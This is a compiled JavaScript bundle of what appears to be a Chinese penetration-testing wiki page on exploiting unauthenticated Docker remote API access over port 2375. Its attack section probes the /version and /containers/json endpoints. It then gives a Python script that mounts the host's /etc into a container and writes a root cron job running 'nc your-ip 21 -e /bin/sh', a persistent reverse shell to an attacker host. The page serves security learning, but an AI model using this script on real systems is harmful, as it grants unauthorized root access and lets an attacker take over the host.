(window.webpackJsonp=window.webpackJsonp||[]).push([[225],{1008:function(s,t,a){s.exports=a.p+"assets/img/1629509264213-4a39c72c-ce8c-42f4-af15-997bd7f86be6.692e7865.png"},1009:function(s,t,a){s.exports=a.p+"assets/img/1629509794103-4c27e6d1-8c28-441a-9b26-0f5326506451.68334bfc.png"},2444:function(s,t,a){"use strict";a.r(t);var e=a(75),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"docker-2375端口"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#docker-2375端口"}},[s._v("#")]),s._v(" Docker 2375端口")]),s._v(" "),e("h2",{attrs:{id:"关于"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#关于"}},[s._v("#")]),s._v(" 关于")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("该未授权访问漏洞是因为 Docker remote api 可执行docker命令，获取信息")]),e("br"),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("从官方文档可以看出，该接口是目的是取代docker 命令界面，通过url操作docker。")]),e("br"),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("而Docker swarm是docker下的分布化应用的本地集群，在开放2375监听集群容器时，就会调用这个api")]),e("br"),s._v(" "),e("h2",{attrs:{id:"攻击方法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#攻击方法"}},[s._v("#")]),s._v(" 攻击方法")]),s._v(" "),e("p",[s._v("访问目标，验证未授权API调用")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[s._v("http://xxx.xxx.xxx.xxx:2375/version\nhttp://xxx.xxx.xxx.xxx:2375/containers/json\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1008),alt:"img"}})]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("使用 Python脚本调用API 反弹Shell")]),e("br"),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("import")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v("\n\nclient "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" docker.DockerClient"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("base_url"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://Remote-IP:2375/'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndata "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" client.containers.run"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'alpine:latest'")]),s._v(", r"),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v("'sh -c "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root\"")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v("', "),e("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("remove")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("True, "),e("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("volumes")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/etc'")]),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'bind'")]),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/tmp/etc'")]),s._v(", "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'mode'")]),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'rw'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1009),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);